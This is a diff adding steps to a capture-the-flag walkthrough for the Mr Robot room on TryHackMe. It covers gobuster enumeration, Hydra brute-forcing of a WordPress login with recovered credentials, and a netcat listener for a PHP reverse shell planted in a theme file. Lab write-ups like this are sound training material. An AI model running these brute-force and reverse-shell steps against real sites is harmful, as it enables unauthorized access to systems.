@@ -52,4 +52,44 @@ additional subdomains. This will help us locate a good place to put the
 
 You can get gobuster here: https://github.com/OJ/gobuster
 
-Then run the following command. 
+Then run the following command.
+
+`gobuster -u 'http://MACHINE_IP' -w any_directory_wordlist.txt -o gobusteroutput.txt `
+
+ONce gobustter is done finding subdomains, we can check which ones have a 200 response:
+
+`cat gobusteroutput.txt | grep 200`
+
+![grep 200 screenshot](grep200.png)
+
+At this point, focus shifts towards the */wp-login* page, wehre we laungh a username and password
+brute force attack using our fsocity.dic wordlist and Hydra (https://github.com/vanhauser-thc/thc-hydra)
+
+The command below was used to brute-force the username(USER = Elliot):
+
+`hydra -L fsocity.dic -p test MACHINE_IP http-post-form "/wp-login.php:log^USER^&pwd^PASS^:Invalid username" -V`
+
+Once we have the username, we can go ahead and use the same wordlist to brute-force the
+password for the newly found username. (PASS= ER28-0652)
+
+`hydra -l Elliot -P fsocity.dic txt MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -V`
+
+This will let us access the wordpress account for Elliot and look around.
+
+In this case, Elliot's ability to use the edit panel from his account enable the use of php scripts
+that will generate a reverses shell which can be used to gain root access.
+
+To get the shell we start listening on port 53 with netcat:
+
+`sudo rlwrap nc -lvnp 53`
+
+then get a reverse shell from wherever you want, the one from the thm walkthrough was this
+one (https://github.com/pentestmonkey/php-reverse-shell). By modifying a php file for a certain them with
+the reverse php shell we get the connection. Load that file on the browser, in this case the URL:
+
+`http://10.10.62.195/wp-content/themes/twentyfifteen/archive.php`
+
+We now go back to the terminal in which we are listening for incoming connections on port 53
+And we have a shell
+
+Check available users on the shell:  `ls /home`
